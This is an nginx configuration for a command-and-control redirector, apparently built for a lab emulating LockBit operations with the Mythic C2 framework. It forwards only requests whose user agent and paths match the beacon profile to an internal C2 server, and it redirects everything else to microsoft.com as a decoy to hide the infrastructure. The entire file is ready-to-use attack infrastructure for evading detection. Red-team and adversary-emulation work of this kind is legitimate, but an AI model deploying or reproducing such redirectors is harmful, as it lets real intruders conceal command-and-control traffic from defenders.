# httpx redirector for the LockBit ops profile (lab, self-signed cert).
# Only /_next.css + /boards with the profile UA reach Mythic httpx (10.23.20.10:82);
# everything else 302s to a decoy. Matches profiles/lockbit-icbc.httpx.toml.
map $http_user_agent $is_beacon_ua {
    default 0;
    "~*Chrome/120\.0\.0\.0 Safari/537\.36" 1;
}
server {
    listen 443 ssl http2;
    server_name _ assets-portal.io;

    ssl_certificate     /etc/nginx/ssl/redir.crt;
    ssl_certificate_key /etc/nginx/ssl/redir.key;
    ssl_protocols TLSv1.2 TLSv1.3;

    location = /_next.css {
        if ($is_beacon_ua = 0) { return 302 https://www.microsoft.com/; }
        proxy_pass http://10.23.20.10:82;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $remote_addr;
    }
    location = /boards {
        if ($is_beacon_ua = 0) { return 302 https://www.microsoft.com/; }
        proxy_pass http://10.23.20.10:82;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $remote_addr;
    }
    location / { return 302 https://www.microsoft.com/; }
}
